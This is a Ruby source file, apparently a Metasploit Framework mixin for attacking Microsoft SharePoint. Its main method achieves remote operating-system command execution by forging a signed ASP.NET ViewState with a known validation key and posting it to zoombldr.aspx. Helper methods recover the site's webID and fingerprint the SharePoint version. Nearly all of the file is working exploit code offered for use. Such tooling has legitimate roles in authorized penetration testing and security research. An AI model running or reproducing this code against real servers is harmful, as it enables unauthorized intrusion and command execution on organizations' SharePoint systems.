# -*- coding: binary -*-

module Msf
  class Exploit
    class Remote
      module HTTP
        # This module provides a way of interacting with sharepoint installations
        module Sharepoint

          include Msf::Exploit::Remote::HttpClient
          include Msf::Exploit::ViewState

          # Execute an operating system command by crafting and sending a viewstate to the remote server. In order for
          # this to work, the *validation_key* must be known.
          #
          # @param [String] cmd The OS command to run on the remote system
          # @param [String] validation_key The remote system's validation key from the web.config file.
          # @param [Hash] http_request_opts Options to override the defaults of the HTTP request.
          #
          # @raise [RuntimeError] This function will raise a RuntimeError via #fail_with if the command failed to
          #   execute.
          #
          # @return [nil] This function doesn't return anything.
          def sharepoint_execute_command_via_viewstate(cmd, validation_key, http_request_opts = {})
            vprint_status("Executing command: #{cmd}")

            res = send_request_cgi(http_request_opts.merge({
              'method' => 'POST',
              'uri' => normalize_uri(target_uri.path, '/_layouts/15/zoombldr.aspx'),
              'vars_post' => {
                '__VIEWSTATE' => generate_viewstate_payload(
                  cmd,
                  extra: pack_viewstate_generator('63E6434F'), # /_layouts/15/zoombldr.aspx
                  algo: 'sha256',
                  key: pack_viewstate_validation_key(validation_key)
                )
              }
            }))

            unless res
              fail_with(Failure::Unreachable, "Target did not respond to #{__method__}")
            end

            unless res.code == 200
              fail_with(Failure::PayloadFailed, "Failed to execute command: #{cmd}")
            end

            vprint_good('Successfully executed command')
          end

          # Get the site's webID.
          #
          # @param [Hash] http_request_opts Options to override the defaults of the HTTP request.
          # @return [String, nil] The webID if it was able to be recovered.
          def sharepoint_get_site_web_id(http_request_opts = {})
            res = send_request_cgi(http_request_opts.merge({
              'method' => 'GET',
              'uri' => normalize_uri(target_uri.path, '_api', 'web', 'id')
            }))

            return nil unless res&.code == 200

            res.get_xml_document.at('//d:Id')&.text
          end

          # Get the SharePoint version number.
          #
          # @see https://docs.microsoft.com/en-us/officeupdates/sharepoint-updates SharePoint Version Numbers
          #
          # @param [Hash] http_request_opts Options to override the defaults of the HTTP request.
          # @return [Rex::Version, nil] The SharePoint version if it was able to be recovered.
          def sharepoint_get_version(http_request_opts = {})
            res = send_request_cgi(http_request_opts.merge({
              'method' => 'GET',
              'uri' => normalize_uri(target_uri.path)
            }))

            return nil unless /^(?<build>[\d.]+)/ =~ res&.headers['MicrosoftSharePointTeamServices']

            Rex::Version.new(build)
          end

        end
      end
    end
  end
end
